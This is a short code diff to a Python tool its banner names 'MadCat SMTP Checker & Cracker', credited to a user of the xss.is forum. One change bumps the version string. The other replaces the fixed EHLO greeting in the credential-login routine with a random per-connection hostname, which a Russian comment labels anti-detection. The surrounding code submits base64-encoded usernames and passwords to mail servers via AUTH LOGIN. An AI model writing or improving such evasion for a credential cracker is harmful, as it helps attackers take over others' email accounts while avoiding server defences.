@@ -49,7 +49,7 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v84.12.15{z}
+          ╙     {b}MadCat SMTP Checker & Cracker v24.12.15{z}
                 Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                 https://github.com/aels/mailtools
                 https://t.me/IamLavander
@@ -350,7 +350,11 @@ def socket_try_login(sock, self_host, smtp_login, smtp_password):
 	smtp_login_b64 = base64_encode(smtp_login)
 	smtp_pass_b64 = base64_encode(smtp_password)
 	smtp_login_pass_b64 = base64_encode(smtp_login+':'+smtp_password)
-	answer = socket_send_and_read(sock, 'EHLO '+self_host)
+	
+	# ПРАВКА: Динамический EHLO name для каждого подключения (антидетект)
+	ehlo_name = f"client-{uuid.uuid4().hex[:8]}.example.com"
+	answer = socket_send_and_read(sock, 'EHLO '+ehlo_name)
+	
 	if re.findall(r'auth[\w =-]+(plain|login)', answer.lower()):
 		if re.findall(r'auth[\w =-]+login', answer.lower()):
 			answer = socket_send_and_read(sock, 'AUTH LOGIN '+smtp_login_b64)
